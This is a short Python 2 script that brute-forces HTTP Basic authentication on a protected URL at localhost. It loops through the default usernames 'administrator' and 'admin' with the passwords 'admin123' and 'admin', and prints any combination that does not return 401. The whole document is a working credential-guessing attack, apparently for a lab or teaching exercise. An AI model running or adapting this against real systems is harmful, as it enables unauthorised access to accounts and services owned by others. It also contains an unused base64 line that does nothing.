import base64
import requests

users=['administrator', 'admin']
passwords=['admin123','admin']
protectedResource = 'http://localhost/secured'

foundPass = False
for user in users:
	if foundPass:
		break
	for passwd in passwords:
		encoded = base64.encodestring(user+':'+passwd)
		response = requests.get(protectedResource, auth=(user,passwd))
		if response.status_code != 401:
			print 'User Found!'
			print 'User: %s, Pass: %s' %(user,passwd)
			foundPass=True
			break
